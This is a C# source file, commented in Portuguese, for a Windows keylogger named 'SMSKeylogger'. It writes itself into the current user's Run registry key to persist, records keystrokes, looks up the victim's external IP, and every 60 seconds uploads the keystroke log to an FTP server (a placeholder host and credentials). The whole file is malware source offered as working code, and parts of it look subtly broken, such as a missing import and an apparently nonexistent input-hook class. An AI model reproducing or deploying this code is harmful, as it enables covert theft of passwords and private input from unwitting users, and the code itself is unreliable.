using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Threading;
using WindowsInput;
using WindowsInput.Native;

class Program
{
    private const int sendTime = 60000; // 60 segundos

    static void Main()
    {
        SMS keyScanner = new SMS();
        keyScanner.Start();
    }
}

class SMS
{
    
    private int sendTime;
    private StringBuilder logAppend;
    private InputSimulator inputSimulator = new InputSimulator();

    public SMS()
    {
        
        this.sendTime = 60000; // 60 segundos
        this.logAppend = new StringBuilder("\nFrom " + GetExternalIP() + " >>> SMS started <<<");
    }

    private string GetExternalIP()
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString("http://ip.42.pl/raw");
            }
        }
        catch
        {
            return "Unable to retrieve IP";
        }
    }

    public void BecomePersistent()
    {
        try
        {
            // Define a chave do Registro de Inicialização
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Adiciona a aplicação à inicialização
            registryKey.SetValue("SMSKeylogger", System.Reflection.Assembly.GetExecutingAssembly().Location);
        }
        catch (Exception ex)
        {
            // Tratamento de exceção (pode ser melhorado)
            Console.WriteLine("Erro ao tornar persistente: " + ex.Message);
        }
    }

    public void MainListener()
{
    DateTime startTime = DateTime.Now;

    using (var listener = new WindowsInput.EventSources.HardwareEventSource.KeyboardEventSource())
    {
        listener.KeyDown += (sender, args) =>
        {
            string key = args.VirtualKey.ToString();
            logAppend.Append(SonModding(key));
        };

        Console.WriteLine("Pressione qualquer tecla. As teclas serão enviadas a cada 60 segundos.");
        while (true)
        {
            if ((DateTime.Now - startTime).TotalMilliseconds >= sendTime)
            {
                // Envia o log e reinicia o temporizador
                SendingFileFTP(logAppend.ToString());
                logAppend.Clear();
                logAppend.Append("\nFrom " + GetExternalIP() + " >>> ");
                startTime = DateTime.Now;
            }

            if (Console.KeyAvailable)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(intercept: true);
                char keyChar = keyInfo.KeyChar;

                // Adiciona a tecla ao log
                logAppend.Append(keyChar);

                // Simula a tecla no sistema para que ela também tenha efeito normalmente
                inputSimulator.Keyboard.TextEntry(keyChar.ToString());
            }

            // Adiciona um pequeno atraso para evitar um alto consumo de CPU
            Thread.Sleep(10); // Ajuste o valor conforme necessário
        }
    }
}


    public string SonModding(string son)
    {
        son = son.Replace("Oem", "");
        switch (son)
        {
            case "Space":
                return " ";
            case "Enter":
                return "\n";
            case "Back":
                return "(del)";
            default:
                if (son.Contains("Key"))
                {
                    return "";
                }
                return son;
        }
    }

    public void SendingFileFTP(string log)
    {
        try
        {
            // Criar arquivo temporário
            string filePath = Path.GetTempFileName();
            File.WriteAllText(filePath, log);

            // Configurar as credenciais FTP
            string ftpServer = "ftp.example.com";
            string ftpUsername = "ftpUsername";
            string ftpPassword = "ftpPassword";

            // Configurar o cliente FTP
            using (WebClient client = new WebClient())
            {
                client.Credentials = new NetworkCredential(ftpUsername, ftpPassword);

                // Carregar o arquivo para o servidor FTP
                client.UploadFile($"ftp://{ftpServer}/logs/{DateTime.Now.ToString("yyyyMMddHHmmss")}_log.txt", WebRequestMethods.Ftp.UploadFile, filePath);
            }

            // Deletar o arquivo temporário
            File.Delete(filePath);
        }
        catch (Exception ex)
        {
            // Tratamento de exceção (não incluído nesta versão)
        }
    }

    public void Start()
    {
        BecomePersistent();

        Thread listenerThread = new Thread(MainListener);
        listenerThread.Start();

        Thread.Sleep(Timeout.Infinite);
    }
}
